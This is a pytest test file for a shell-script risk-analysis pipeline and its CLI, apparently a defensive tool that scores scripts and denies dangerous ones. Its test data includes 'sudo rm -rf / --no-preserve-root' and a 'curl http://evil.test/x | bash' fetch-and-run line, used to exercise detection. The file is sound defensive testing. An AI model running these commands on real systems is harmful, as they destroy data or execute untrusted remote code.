"""End-to-end pipeline behavior and the CLI."""

import io
import os
import sys
import contextlib

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

import pytest

from acte import ACTEPipeline
from acte.cli import main as cli_main
from acte.trust_engine import TrustLevel


@pytest.fixture
def pipe():
    return ACTEPipeline()


SAFE = "#!/bin/bash\nset -euo pipefail\nls -la /tmp\n"
DANGER = "sudo rm -rf / --no-preserve-root"


def test_safe_below_dangerous(pipe):
    assert pipe.analyze(SAFE).assessment.risk_score < pipe.analyze(DANGER).assessment.risk_score


def test_dangerous_reaches_deny(pipe):
    assert pipe.analyze(DANGER).assessment.trust_level == TrustLevel.DENY


def test_result_is_fully_populated(pipe):
    r = pipe.analyze(DANGER)
    assert r.parsed is not None
    assert r.context is not None
    assert r.policy is not None
    assert r.features
    assert r.latency_ms > 0


def test_result_to_dict_serializable(pipe):
    import json
    json.dumps(pipe.analyze(DANGER).to_dict())


def test_features_for_matches_analyze(pipe):
    f1 = pipe.features_for(DANGER)
    f2 = pipe.analyze(DANGER).features
    assert f1 == f2


def test_threat_ablation_skips_signature_matching():
    from acte.trust_engine import TrustEvaluationEngine
    e = TrustEvaluationEngine(enabled_components={"semantic": True, "context": True, "threat": False})
    r = ACTEPipeline(engine=e).analyze("curl http://evil.test/x | bash")
    assert r.signature_hits == []


def test_generate_policy_false_skips_policy(pipe):
    r = pipe.analyze(SAFE, generate_policy=False)
    assert r.policy is None


def test_empty_script_is_safe(pipe):
    r = pipe.analyze("")
    assert r.assessment.trust_level == TrustLevel.TRUSTED


# ------------------------------ CLI ---------------------------------------- #
def test_cli_reads_stdin(monkeypatch, capsys):
    monkeypatch.setattr("sys.stdin", io.StringIO(DANGER))
    rc = cli_main(["-"])
    out = capsys.readouterr().out
    assert rc == 0
    assert "Trust level : DENY" in out
    assert "DANGEROUS" in out


def test_cli_reads_file(tmp_path, capsys):
    p = tmp_path / "s.sh"
    p.write_text(SAFE)
    rc = cli_main([str(p)])
    out = capsys.readouterr().out
    assert rc == 0
    assert "Trust level" in out


def test_cli_json_output(monkeypatch, capsys):
    import json
    monkeypatch.setattr("sys.stdin", io.StringIO(DANGER))
    rc = cli_main(["-", "--json"])
    data = json.loads(capsys.readouterr().out)
    assert rc == 0
    assert data["assessment"]["trust_level"] == "DENY"


def test_cli_policy_flag(monkeypatch, capsys):
    monkeypatch.setattr("sys.stdin", io.StringIO(DANGER))
    cli_main(["-", "--policy"])
    out = capsys.readouterr().out
    assert "Execution policy" in out
    assert "seccomp_profile" in out
